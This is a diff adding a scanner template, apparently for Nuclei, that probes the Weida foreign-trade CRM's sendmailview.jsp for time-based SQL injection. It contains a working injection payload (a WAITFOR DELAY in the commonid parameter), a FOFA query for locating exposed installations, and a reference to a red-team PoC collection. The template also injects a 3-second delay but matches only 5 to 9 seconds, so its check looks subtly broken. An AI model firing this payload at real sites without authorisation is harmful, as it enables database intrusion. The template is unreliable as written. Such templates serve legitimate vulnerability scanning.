@@ -1,0 +1,33 @@
+id: weidasoft-crm-sendmailview-sqli
+info:
+  name: 维达外贸客户关系管理系统 sendmailview.jsp SQL注入
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/crushforyou/2025hvv-poc/blob/9ca070a79859f2137ff65d1328ed6c5a2238f11d/%E7%BB%B4%E8%BE%BE/%E7%BB%B4%E8%BE%BE%E5%A4%96%E8%B4%B8%E5%AE%A2%E6%88%B7%E5%85%B3%E7%B3%BB%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20sendmailview.jsp%20SQL%E6%B3%A8%E5%85%A5.txt
+    - https://cn-sec.com/archives/4288393.html
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: title="维达外贸客户关系管理系统"
+    tips:
+    repair:
+    sqlmap:
+    version:
+  tags: sqli,weidasoft
+
+http:
+  - raw:  
+      - |
+        @timeout: 15s
+        GET /wap/common/sendmailview.jsp?commonid=1';WAITFOR+DELAY+'0:0:3'-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - duration >= 5 && duration < 9
+        condition: and
